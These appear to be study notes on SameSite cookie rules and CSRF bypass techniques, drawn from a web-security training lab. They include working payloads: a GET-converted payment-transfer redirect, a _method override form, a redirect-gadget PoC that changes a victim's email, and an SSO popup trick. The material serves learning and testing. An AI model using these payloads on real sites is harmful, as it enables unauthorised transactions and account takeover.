
## Summary

**Context:**
- `strict` = same-site only
- `lax` = GET and top-level navigation from user (i.e. click)
- `none` = no restrictions

**Bypasses:**

1. Bypass `Lax` restriction:
	1. use GET request instead of post
	2. override method by using `_method` on form
	3. refresh user cookie by sending a request to SSO login first
2. Bypass `Strict` restriction
	1. use a gadget on the website that allows dynamic redirection
3. General bypass
	1. try using a sibling domain (e.g. .net instead of .com)
	2. try CSWSH (cross-site websocket hijacking)

## What is a site in the context of SameSite cookies?

In the context of SameSite cookie restrictions, a site is defined as the top-level domain (TLD), usually something like `.com` or `.net`, plus one additional level of the domain name. This is often referred to as the TLD+1.

## What's the difference between a site and an origin?

The difference between a site and an origin is their scope; a site encompasses multiple domain names, whereas an origin only includes one. Although they're closely related, it's important not to use the terms interchangeably as conflating the two can have serious security implications.

- Origin: `https://app.example.com`
- Site: `https://example.com`

## Examples

`https://example.com` --> `https://example.com` = same-site and same-origin
`https://app.example.com` --> `https://intranet.example.com` = same-site, not same-origin
`https://example.com` --> `https://example.com:8080` = same-site, not same-origin
`https://example.com` --> `https://example.co.uk` = not same-site, not same-origin
`https://example.com` --> `http://example.com` = not same-site, not same-origin\

## Restriction levels

All major browsers currently support the following same-site restriction levels:
- Strict
- Lax
- None
If no restriction is provided by the developer, Chrome automatically applies `Lax` by default.

### Strict

If a cookie is set with the `SameSite=Strict` attribute, browsers will not send it in any cross-site requests. In simple terms, this means that if the target site for the request does not match the site currently shown in the browser's address bar, it will not include the cookie.

### Lax

`Lax` SameSite restrictions mean that browsers will send the cookie in cross-site requests, but only if both of the following conditions are met:

-   The request uses the `GET` method.
-   The request resulted from a top-level navigation by the user, such as clicking on a link.

### None

If a cookie is set with the `SameSite=None` attribute, this effectively disables SameSite restrictions altogether, regardless of the browser. As a result, browsers will send this cookie in all requests to the site that issued it, even those that were triggered by completely unrelated third-party sites.

With the exception of Chrome, this is the default behavior used by major browsers if no `SameSite` attribute is provided when setting the cookie.

## Bypassing Restrictions

### Bypassing SameSite Lax restrictions using GET requests

Sometimes you can `POST` stuff using a `GET` request.

So this POST request:

```http
POST /account/transfer-payment HTTP/1.1
Host: vulnerable-website.com

recipient=hacker&amount=1000000
```

can be represented as GET:

```http
GET /account/transfer-payment?recipient=hacker&amount=1000000 HTTP/1.1
Host: vulnerable-website.com
```

So a payload as such can be used in the CSRF attack:

```javascript
<script>
    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
</script>
```

Even if an ordinary `GET` request isn't allowed, some frameworks provide ways of overriding the method specified in the request line. For example, Symfony supports the `_method` parameter in forms, which takes precedence over the normal method for routing purposes:

```javascript
<form action="https://vulnerable-website.com/account/transfer-payment" method="GET">
    <input type="hidden" name="_method" value="POST">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
```

### Bypassing SameSite restrictions using on-site gadgets

If a cookie is set with the `SameSite=Strict` attribute, browsers won't include it in any cross-site requests. You may be able to get around this limitation if you can find a gadget that results in a secondary request within the same site.

One possible gadget is a client-side redirect that dynamically constructs the redirection target using attacker-controllable input like URL parameters

Example of working PoC:

```javascript
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>
      document.location = "https://0a7d004f04e099a3c09c4a8f001800a4.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=test3%40evil.com%26submit=1"
    </script>
  </body>
</html>
```

This worked because on `/post/comment/confirmation` runs the following script:

```javascript
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```

We injected the `postId` to self-redirect the application to obtain CSRF.

### Bypassing SameSite restrictions via vulnerable sibling domains

Whether you're testing someone else's website or trying to secure your own, it's essential to keep in mind that a request can still be same-site even if it's issued cross-origin.

Make sure you thoroughly audit all of the available attack surface, including any sibling domains. In particular, vulnerabilities that enable you to elicit an arbitrary secondary request, such as [XSS](https://portswigger.net/web-security/cross-site-scripting), can compromise site-based defenses completely, exposing all of the site's domains to cross-site attacks.

### Bypassing SameSite Lax restrictions with newly issued cookies

Cookies with `Lax` SameSite restrictions aren't normally sent in any cross-site `POST` requests, but there are some exceptions.

As mentioned earlier, if a website doesn't include a `SameSite` attribute when setting a cookie, Chrome automatically applies `Lax` restrictions by default. However, to avoid breaking single sign-on (SSO) mechanisms, it doesn't actually enforce these restrictions for the first 120 seconds on top-level `POST` requests. As a result, there is a two-minute window in which users may be susceptible to cross-site attacks.

To trigger the cookie refresh without the victim having to manually log in again, you need to use a top-level navigation, which ensures that the cookies associated with their current [OAuth](https://portswigger.net/web-security/oauth) session are included. This poses an additional challenge because you then need to redirect the user back to your site so that you can launch the CSRF attack.

Alternatively, you can trigger the cookie refresh from a new tab so the browser doesn't leave the page before you're able to deliver the final attack. A minor snag with this approach is that browsers block popup tabs unless they're opened via a manual interaction. For example, the following popup will be blocked by the browser by default:

`window.open('https://vulnerable-website.com/login/sso');`

To get around this, you can wrap the statement in an `onclick` event handler as follows:

`window.onclick = () => { window.open('https://vulnerable-website.com/login/sso'); }`

This way, the `window.open()` method is only invoked when the user clicks somewhere on the page.